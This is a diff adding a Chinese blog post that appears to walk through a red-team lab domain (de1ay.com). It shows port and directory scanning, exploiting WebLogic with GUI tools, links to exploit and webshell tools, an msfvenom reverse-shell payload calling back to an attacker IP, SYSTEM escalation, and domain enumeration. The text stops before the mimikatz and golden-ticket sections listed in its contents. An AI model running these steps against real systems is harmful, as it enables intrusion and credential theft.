@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8"/>
+    <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
+    <title>
+      
+        ATT&CK红队评估(二) | Blanks'Blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    
+      
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/regular.ttf);
+        font-weight: regular;
+    }
+  </style>
+
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/bold.ttf);
+        font-weight: bold;
+    }
+  </style>
+
+
+    
+    <link rel="stylesheet"
+          type="text/css"
+          href='/css/layout.css'/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css" />
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href='/' class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg"/>
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">Notes</a>
+            
+          
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner--toc">
+      <div class="post-content__head">
+        <div class="post-title">ATT&CK红队评估(二)</div>
+        <div class="post-info">
+          
+  <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-tag">#内网渗透</a><a href="/tags/ATT-CK/" class="post-tag">#ATT&CK</a><a href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="post-tag">#权限维持</a><a href="/tags/Venom/" class="post-tag">#Venom</a>
+
+
+          <span class="post-date">2023-05-17</span>
+        </div>
+      </div>
+      
+        <aside class="toc-outer">
+          <div class="toc-title">目录</div>
+          <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">WEB服务器</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">信息搜集—打点</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">Weblogic</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">漏洞验证</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">上线</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">本机内网信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">提权</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">域内信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">关闭防火墙 &#x2F; 360</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">抓取密码</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link"><span class="post-toc-text">使用kiwi模块 里面的mimikatz</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">获取到的基本信息</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">搭建隧道</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">横向移动 —&gt; PC$</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">DCOM</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">DCOM的方法</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">派生给CS</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">域控</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">黄金票据</span></a></li></ol>
+          <a href="#" class="toc-top">回到顶部</a>
+        </aside>
+      
+      <div class="post-content__body">
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <meta name="referrer" content="no-referrer">
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/22356351/1684220361919-3070b9e6-6e88-4b02-94dd-bca504a769e6.jpeg"></p>
+<p><a name="mvcN8"></a></p>
+<h1><span id="web服务器">WEB服务器</span></h1><p><a name="v9CtK"></a></p>
+<h2><span id="信息搜集打点">信息搜集—打点</span></h2><ul>
+<li>Nmap端口扫描<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">nmap -sV -O -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> <span class="hljs-number">192.168</span><span class="hljs-number">.145</span><span class="hljs-number">.150</span><br></code></pre></td></tr></table></figure>
+发现开放防火墙是不能使用ping的 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684221152487-b266cf35-e048-4b69-a547-87581d9ebb1b.png#averageHue=%2318191c&clientId=uf01e4eae-ddaf-4&from=paste&height=140&id=u5dc46c4f&originHeight=279&originWidth=1477&originalType=binary&ratio=2&rotation=0&showTitle=false&size=51735&status=done&style=none&taskId=ubb2900a3-d51b-4069-83d6-58c0854f137&title=&width=738.5" alt="image.png"><br>命令换成 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">nmap -sV <span class="hljs-number">192.168</span><span class="hljs-number">.145</span><span class="hljs-number">.150</span><br>或者 -A <br>也是可以的<br></code></pre></td></tr></table></figure>
+<img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684221218912-4eb32abd-0f9e-4db7-ba05-05ffefd2edcf.png#averageHue=%2318191b&clientId=uf01e4eae-ddaf-4&from=paste&height=688&id=u8a4017d1&originHeight=1375&originWidth=1608&originalType=binary&ratio=2&rotation=0&showTitle=false&size=288125&status=done&style=none&taskId=u9896d9d3-0c6a-4265-8db4-182b4ba2b6f&title=&width=804" alt="image.png"><br>端口开放的比较多还是 <br>可以看出这个web服务器开放的RPC服务比较多 ，在寻找RPC的漏洞时，发现RPC还可以利用来提权<blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11313#toc-0">https://xz.aliyun.com/t/11313#toc-0</a></p>
+</blockquote>
+</li>
+</ul>
+<p>然后同时发现是win2008 R2 系统是否存在MS08-067 经典漏洞利用呢，尝试一波<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684221886966-6f20796a-ed0f-4e63-b635-c1cad4654ffd.png#averageHue=%23191a1c&clientId=uf01e4eae-ddaf-4&from=paste&height=145&id=u43853b71&originHeight=290&originWidth=1482&originalType=binary&ratio=2&rotation=0&showTitle=false&size=73652&status=done&style=none&taskId=u1c740160-82b6-49a4-a6a7-71fae722e7b&title=&width=741" alt="image.png"><br>看来并不存在这个漏洞或许打了补丁防火墙子内的 <br>再次尝试 80 端口 和 7001 端口</p>
+<ul>
+<li>80端口</li>
+</ul>
+<p>白版<img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684222116729-bbebeb38-becb-49db-b2e7-b28afbb2f89c.png#averageHue=%23e5e5e5&clientId=uf01e4eae-ddaf-4&from=paste&height=527&id=u1e6ca927&originHeight=1053&originWidth=1764&originalType=binary&ratio=2&rotation=0&showTitle=false&size=39122&status=done&style=none&taskId=ue7a7e0c7-d59d-4d8d-b0d1-80085189897&title=&width=882" alt="image.png"><br>没有啥子数据啊<br>对其进行目录扫描 ，这种白板也是不能放过的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">dirsearch -u http://<span class="hljs-number">192.168</span><span class="hljs-number">.145</span><span class="hljs-number">.150</span>    <br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684222418727-9f0feda8-008e-497c-8660-5113b1cdde54.png#averageHue=%23181a1e&clientId=uf01e4eae-ddaf-4&from=paste&height=367&id=ue0561bb3&originHeight=733&originWidth=1535&originalType=binary&ratio=2&rotation=0&showTitle=false&size=109804&status=done&style=none&taskId=u853c0cca-d448-40a0-8ec3-6a988e92bc8&title=&width=767.5" alt="image.png"><br>还是没有啥发现，只存在于一个&#x2F;aspnet_client&#x2F; 目录，这个目录是IIS下，常有的一个目录文件<br>该文件夹中含有集成了 ASP.NET 的“SmartNavigation”功能 的 <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=javascript&spm=1001.2101.3001.7020">javascript</a>。如果启用 SmartNavigation，网页设计人员就可以在页面以及其他内容之间保持滚动条和元素焦点的位置。<br>aspnet_client 是虚拟根 Web 应用程序目录，该目录是当您安 装 .NET Framework SDK 或 Visual Studio .NET 时在您的计算机上创建的。此文件不占用户空间。<br><a name="Usj3n"></a></p>
+<h2><span id="weblogic">Weblogic</span></h2><ul>
+<li>7001端口</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684222601099-1a57b96f-39a9-4f0a-a420-67cb05b37ba0.png#averageHue=%23e7e6e6&clientId=uf01e4eae-ddaf-4&from=paste&height=587&id=u6c07e5de&originHeight=1174&originWidth=2774&originalType=binary&ratio=2&rotation=0&showTitle=false&size=129328&status=done&style=none&taskId=ub82cdb1a-50a3-4a9c-8a12-2ebaa34c895&title=&width=1387" alt="image.png"><br>7001 端口众所周知是weblogic的中间件的常用端口 <br>对其进行端口扫描：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">dirsearch -u http://<span class="hljs-number">192.168</span><span class="hljs-number">.145</span><span class="hljs-number">.150</span>:<span class="hljs-number">7001</span> <br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684222681307-9a471648-5412-4437-9831-61352b1d8756.png#averageHue=%23181a1d&clientId=uf01e4eae-ddaf-4&from=paste&height=613&id=uc81be3a5&originHeight=1225&originWidth=2150&originalType=binary&ratio=2&rotation=0&showTitle=false&size=291589&status=done&style=none&taskId=u5a850a1b-4c31-44a1-9354-d27ae3cd12e&title=&width=1075" alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">[03:<span class="hljs-number">32</span>:<span class="hljs-number">13</span>] <span class="hljs-number">200</span> -    0B  - /bea_wls_deployment_internal/DeploymentService<br>[03:<span class="hljs-number">32</span>:<span class="hljs-number">13</span>] <span class="hljs-number">200</span> -    0B  - /bea_wls_internal/HTTPClntRecv<br>[03:<span class="hljs-number">32</span>:<span class="hljs-number">15</span>] <span class="hljs-number">302</span> -  285B  - /bea_wls_internal  -&gt;  http://<span class="hljs-number">192.168</span><span class="hljs-number">.145</span><span class="hljs-number">.150</span>:<span class="hljs-number">7001</span>/bea_wls_in<br>[03:<span class="hljs-number">32</span>:<span class="hljs-number">15</span>] <span class="hljs-number">200</span> -   49B  - /bea_wls_internal/<br>[03:<span class="hljs-number">32</span>:<span class="hljs-number">15</span>] <span class="hljs-number">200</span> -    0B  - /bea_wls_internal/iiop/ClientRecvte<br>[03:<span class="hljs-number">32</span>:<span class="hljs-number">30</span>] <span class="hljs-number">302</span> -  305B  - /console/  -&gt;  http://<span class="hljs-number">192.168</span><span class="hljs-number">.145</span><span class="hljs-number">.150</span>:<span class="hljs-number">7001</span>/console/login/LoginF<br>[03:<span class="hljs-number">32</span>:<span class="hljs-number">30</span>] <span class="hljs-number">302</span> -  267B  - /console  -&gt;  http://<span class="hljs-number">192.168</span><span class="hljs-number">.145</span><span class="hljs-number">.150</span>:<span class="hljs-number">7001</span>/console/<br>[03:<span class="hljs-number">34</span>:<span class="hljs-number">24</span>] <span class="hljs-number">200</span> -  855B  - /uddi/uddilistener<br></code></pre></td></tr></table></figure>
+<p>既然是Weblogic中间件 ，可能是存在漏洞的，毕竟weblogic漏洞挺多的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684222888827-6585fd65-5dc9-44cd-84c9-b321e6d88272.png#averageHue=%238eb2c7&clientId=uf01e4eae-ddaf-4&from=paste&height=749&id=u00a1388a&originHeight=1497&originWidth=2677&originalType=binary&ratio=2&rotation=0&showTitle=false&size=406392&status=done&style=none&taskId=u50e236fa-f879-4606-97e8-6a521a22476&title=&width=1338.5" alt="image.png"><br>使用漏洞验证工具 去验证是否存在漏洞<br><a name="ReiP8"></a></p>
+<h3><span id="漏洞验证">漏洞验证</span></h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684223002104-dfb2fad0-3065-43fb-84d3-d9ac028c41ea.png#averageHue=%231e1e1e&clientId=uf01e4eae-ddaf-4&from=paste&height=656&id=ud65c5321&originHeight=1312&originWidth=2538&originalType=binary&ratio=2&rotation=0&showTitle=false&size=294708&status=done&style=none&taskId=uec2bc6c4-bdf4-47d7-8782-bda3c052425&title=&width=1269" alt="image.png"><br>存在漏洞还是有几个的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">[<span class="hljs-number">15</span>:<span class="hljs-number">42</span>:<span class="hljs-number">54</span>][INFO] [+][CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">2883</span>][<span class="hljs-number">192.168</span><span class="hljs-number">.145</span><span class="hljs-number">.150</span>:<span class="hljs-number">7001</span>] Exists vulnerability!<br>[<span class="hljs-number">15</span>:<span class="hljs-number">42</span>:<span class="hljs-number">54</span>][INFO] [+][CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">2555</span>][<span class="hljs-number">192.168</span><span class="hljs-number">.145</span><span class="hljs-number">.150</span>:<span class="hljs-number">7001</span>] Exists vulnerability!<br>[<span class="hljs-number">15</span>:<span class="hljs-number">42</span>:<span class="hljs-number">51</span>][INFO] [+][CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">14750</span>][<span class="hljs-number">192.168</span><span class="hljs-number">.145</span><span class="hljs-number">.150</span>:<span class="hljs-number">7001</span>] Exists vulnerability!<br>[<span class="hljs-number">15</span>:<span class="hljs-number">42</span>:<span class="hljs-number">51</span>][INFO] [+][CVE-<span class="hljs-number">2019</span>-<span class="hljs-number">2729</span>][<span class="hljs-number">192.168</span><span class="hljs-number">.145</span><span class="hljs-number">.150</span>:<span class="hljs-number">7001</span>] Exists vulnerability!<br>[<span class="hljs-number">15</span>:<span class="hljs-number">42</span>:<span class="hljs-number">50</span>][INFO] [+][CVE-<span class="hljs-number">2019</span>-<span class="hljs-number">2725</span>][<span class="hljs-number">192.168</span><span class="hljs-number">.145</span><span class="hljs-number">.150</span>:<span class="hljs-number">7001</span>] Exists vulnerability!<br>............<br></code></pre></td></tr></table></figure>
+<p>漏洞既然这么多，我这里使用GUI的漏洞利用工具去获取shell<br>使用 CVE-2016-0638 可以直接写入命令，<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684223368406-80f67bad-361a-499d-9ac3-4fa4065fe9e2.png#averageHue=%23fafafa&clientId=uf01e4eae-ddaf-4&from=paste&height=362&id=u6fe3c0e3&originHeight=723&originWidth=895&originalType=binary&ratio=2&rotation=0&showTitle=false&size=26247&status=done&style=none&taskId=ud6739aa4-2b5f-4ecd-983c-3aa6cb32a46&title=&width=447.5" alt="image.png"><br>获取shell 使用另外一款weblogic的工具注入内存<img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684223425975-b4ad87a5-301a-45e8-a0d3-2f158fe52d80.png#averageHue=%233e3521&clientId=uf01e4eae-ddaf-4&from=paste&height=24&id=u5fa143e7&originHeight=48&originWidth=48&originalType=binary&ratio=2&rotation=0&showTitle=false&size=3590&status=done&style=none&taskId=u61d08d37-9f4d-4501-bc25-c3b2ecbf193&title=&width=24" alt="19F3E3FF.png">或者shell <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684223441068-5a41dd58-d894-483e-85dc-860c7677d56f.png#averageHue=%23f2f2f2&clientId=uf01e4eae-ddaf-4&from=paste&height=700&id=ud29a3b20&originHeight=1399&originWidth=1722&originalType=binary&ratio=2&rotation=0&showTitle=false&size=84884&status=done&style=none&taskId=u954d4780-40bc-4737-9317-e0e077c7f4c&title=&width=861" alt="image.png"><br>使用蚁剑去连接就ok<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684223516095-c051d10d-1018-47d5-894b-3eae52dbd3fa.png#averageHue=%23eeeeee&clientId=uf01e4eae-ddaf-4&from=paste&height=532&id=u6c2467a9&originHeight=1064&originWidth=1563&originalType=binary&ratio=2&rotation=0&showTitle=false&size=139575&status=done&style=none&taskId=u538f44ee-0ccc-49c9-a7c4-6909ba3c10a&title=&width=781.5" alt="image.png"></p>
+<p>Weblogic利用工具链接</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">v4<span class="hljs-number">.0</span><span class="hljs-number">.1</span>-godzilla<br>https://github.com/BeichenDream/Godzilla/releases/tag/v4<span class="hljs-number">.0</span><span class="hljs-number">.1</span>-godzilla  哥斯拉<br><br>Behinder_v4<span class="hljs-number">.0</span><span class="hljs-number">.6</span>   冰蝎<br>https://github.com/rebeyond/Behinder/releases/tag/Behinder_v4<span class="hljs-number">.0</span><span class="hljs-number">.6</span><br><br>Weblogic一键漏洞检测工具，V1<span class="hljs-number">.5</span>  WeblogicScan<br>https://github.com/rabbitmask/WeblogicScan<br><br><br>weblogicScaner<br>https://github.com/0xn0ne/weblogicScanner<br><br><br>Weblogic漏洞利用图形化工具 支持注入内存马、一键上传webshell、命令执行<br>https://github.com/sp4zcmd/WeblogicExploit-GUI/releases/tag/WeblogicExploit-GUI<br><br><br>WeblogicTool_1<span class="hljs-number">.1</span>.jar  深信服深蓝实验室天威战队<br>https://github.com/KimJun1010/WeblogicTool/releases/tag/v1<span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure>
+<p>如果是写shell的话要写在war 目录下（百度得之）<br><a name="ToyQi"></a></p>
+<h2><span id="上线">上线</span></h2><p>生成msfvenom木马</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span><span class="hljs-number">.145</span><span class="hljs-number">.130</span>  LPORT=<span class="hljs-number">1111</span> -f exe &gt; win08.exe<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684224074604-fc0fe920-b0cb-4726-b3ce-c9137024d542.png#averageHue=%23191a1c&clientId=uf01e4eae-ddaf-4&from=paste&height=118&id=u273c9e23&originHeight=235&originWidth=1641&originalType=binary&ratio=2&rotation=0&showTitle=false&size=53037&status=done&style=none&taskId=u63bc9aef-ea63-48cb-b847-7b970fe3e4f&title=&width=820.5" alt="image.png"><br>上传上去<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684224169553-1d2db135-88a9-49c5-a881-c1f5304bc7c3.png#averageHue=%23f1f0f0&clientId=uf01e4eae-ddaf-4&from=paste&height=372&id=u2fec8f95&originHeight=744&originWidth=1150&originalType=binary&ratio=2&rotation=0&showTitle=false&size=65260&status=done&style=none&taskId=u4a4c511b-68b8-46f0-a6f3-81c1d6b2ed6&title=&width=575" alt="image.png"><br>设置 监听 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684237737615-f7331b8d-25b9-4c64-87df-916c55f2c994.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=377&id=u1ce2c8f9&originHeight=377&originWidth=1981&originalType=binary&ratio=2&rotation=0&showTitle=false&size=72486&status=done&style=none&taskId=ue4e169ae-152b-4211-8b7b-8aeae9e7a80&title=&width=1981" alt="image.png"><br>运行 win08.exe shell文件 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684237758596-c06a6afe-b001-44d6-9b17-e34299c7cd4e.png#averageHue=%23171717&clientId=uf01e4eae-ddaf-4&from=paste&height=71&id=u4bc4fa85&originHeight=71&originWidth=969&originalType=binary&ratio=2&rotation=0&showTitle=false&size=12780&status=done&style=none&taskId=uf5e5e0d9-0d39-4998-b17f-a92e924b643&title=&width=969" alt="image.png"><br>Run  运行获取shell<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684237775522-66a1043f-c18d-40bb-bf8b-4f009b2c2574.png#averageHue=%2317181b&clientId=uf01e4eae-ddaf-4&from=paste&height=254&id=u0bd43da2&originHeight=254&originWidth=2016&originalType=binary&ratio=2&rotation=0&showTitle=false&size=45058&status=done&style=none&taskId=u9c5584aa-b0af-41a7-9c96-b3fe568d0e1&title=&width=2016" alt="image.png"><br><a name="T8qYY"></a></p>
+<h2><span id="本机内网信息搜集">本机内网信息搜集</span></h2><ul>
+<li>ipconfig   &#x2F;all</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684239036962-59fc5ebc-dcab-43e8-b020-c4221474f8a6.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=1403&id=uf5e7ff16&originHeight=1403&originWidth=1694&originalType=binary&ratio=2&rotation=0&showTitle=false&size=216069&status=done&style=none&taskId=ud18539ea-e89f-4f40-b18d-7e5ccd501d2&title=&width=1694" alt="image.png"><br>ping 域<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684239078262-eb9bbd43-ce9c-4381-8cb7-e97f8aa1eae5.png#averageHue=%2318191b&clientId=uf01e4eae-ddaf-4&from=paste&height=507&id=u90674ea4&originHeight=507&originWidth=1305&originalType=binary&ratio=2&rotation=0&showTitle=false&size=75587&status=done&style=none&taskId=u694d5e50-80f9-41a7-af06-a0490a6c8cd&title=&width=1305" alt="image.png"></p>
+<ul>
+<li>whoami</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684238030667-bb2918de-e2b3-48c8-abc1-4f715e19da8f.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=132&id=ud80d07e1&originHeight=132&originWidth=1118&originalType=binary&ratio=2&rotation=0&showTitle=false&size=10909&status=done&style=none&taskId=u60e92e92-9254-4870-8c44-0b75f75932f&title=&width=1118" alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">systeminfo // 查看操作系统信息<br>echo %PROCESSOR_ARCHITECTURE%    // 查看系统体系结构<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684238191148-f3729d72-aa51-42d8-a0e6-b9e0512fe3ec.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=1373&id=uf5b95f14&originHeight=1373&originWidth=1816&originalType=binary&ratio=2&rotation=0&showTitle=false&size=258211&status=done&style=none&taskId=ubd4d69d9-8204-4a0d-a01a-e2b3abc2425&title=&width=1816" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684238246738-c255c08c-d445-415d-89b6-d4e57f3c5e96.png#averageHue=%2318191b&clientId=uf01e4eae-ddaf-4&from=paste&height=74&id=ub97c0269&originHeight=74&originWidth=843&originalType=binary&ratio=2&rotation=0&showTitle=false&size=7709&status=done&style=none&taskId=ubf1c72df-68ba-4a69-b5d4-1b88fa37fa4&title=&width=843" alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">net user                                // 查看本地用户<br>net localgroup administrators           // 查看本地管理员组（通常包含域用户）<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684238330490-8138b0c5-5384-4964-be61-737dbf83c941.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=1024&id=u3c5fef8c&originHeight=1024&originWidth=1486&originalType=binary&ratio=2&rotation=0&showTitle=false&size=90908&status=done&style=none&taskId=u9480f500-ae75-4c71-b852-debbc176ea6&title=&width=1486" alt="image.png"><br><a name="QXDFv"></a></p>
+<h3><span id="提权">提权</span></h3><p>迁移进程 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ps -ef | grep svchost.exe<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684238848271-4a6c9a69-5274-43f0-8bc0-63ac96d47788.png#averageHue=%23191a1c&clientId=uf01e4eae-ddaf-4&from=paste&height=713&id=u04b76c39&originHeight=713&originWidth=1592&originalType=binary&ratio=2&rotation=0&showTitle=false&size=201063&status=done&style=none&taskId=u50b2dc0b-4b69-43f4-9f41-60c7f54571a&title=&width=1592" alt="image.png"><br>使用这个PID为 636的进程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">migrate 636<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684238898994-30ad6237-4d2c-49e8-8c93-909607c4b2c7.png#averageHue=%23191a1c&clientId=uf01e4eae-ddaf-4&from=paste&height=615&id=u9602697b&originHeight=615&originWidth=2150&originalType=binary&ratio=2&rotation=0&showTitle=false&size=154580&status=done&style=none&taskId=u5207ecb6-0425-443b-b917-578316b22e0&title=&width=2150" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684238906290-6818bf15-2839-4150-ad4b-0c13ccb825d3.png#averageHue=%2318191b&clientId=uf01e4eae-ddaf-4&from=paste&height=158&id=u3cc4f308&originHeight=158&originWidth=876&originalType=binary&ratio=2&rotation=0&showTitle=false&size=13539&status=done&style=none&taskId=u9f3e64dd-1c45-4b5c-ad40-e462d1d7b84&title=&width=876" alt="image.png"><br>查看权限已经是system权限了<br>本机基本信息搜集可以得知</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">IP <br><span class="hljs-number">192.168</span><span class="hljs-number">.145</span><span class="hljs-number">.150</span><br><span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.80</span>  内网网卡 <br><br>域控 <br>de1ay.com<br><span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.10</span><br><br>administrator 权限 <br><br>用户/组 ：<br>Administrator<br>de1ay<br>DE1AY\Domain<br><br>补丁:<br>[01]: KB2999226<br>[02]: KB958488<br>[03]: KB976902<br></code></pre></td></tr></table></figure>
+<p><a name="MPZAE"></a></p>
+<h2><span id="域内信息搜集">域内信息搜集</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">net config workstation     // 查看当前计算机名，全名，用户名，系统版本，工作站域，登陆的域等<br>net view /domain              // 查看域<br>net time /domain           // 主域服务器会同时作为时间服务器<br>net user /domain      // 查看域用户<br>net group /domain     // 查看域内用户组列表<br>net group <span class="hljs-string">&quot;domain computers&quot;</span> /domain      // 查看域内的机器<br>net group <span class="hljs-string">&quot;domain controllers&quot;</span> /domain          // 查看域控制器组<br>net group <span class="hljs-string">&quot;Enterprise Admins&quot;</span> /domain    // 查看域管理员组<br></code></pre></td></tr></table></figure>
